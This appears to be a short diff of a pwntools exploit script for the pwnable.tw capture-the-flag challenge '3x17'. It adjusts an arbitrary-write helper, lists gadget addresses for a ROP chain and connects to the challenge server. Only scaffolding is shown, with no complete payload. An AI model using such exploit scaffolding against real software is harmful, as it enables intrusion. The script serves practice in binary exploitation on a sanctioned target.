@@ -13,13 +13,19 @@ SYSCALL = 0x4022b4
 LEAVE_RET = 0x401c4b
 STR_ADDR = 0x4b4140
 
+#def write_24(addr, data):
+#    p.recvuntil(b'addr:')
+#    p.sendline(str(addr).encode())
+#    p.recvuntil(b'data:')
+#    p.sendline(data)
+
 def write_24(addr, data):
     p.recvuntil(b'addr:')
-    p.sendline(str(addr).encode())
+    p.sendline(str(addr).encode()) 
     p.recvuntil(b'data:')
-    p.sendline(data)
+    p.send(data)
 
-context.binary = binary = ELF('./3x17')
+#context.binary = binary = ELF('./3x17')
 #p = gdb.debug('./3x17')
 #p = process('./3x17')
 p = remote('chall.pwnable.tw', 10105)
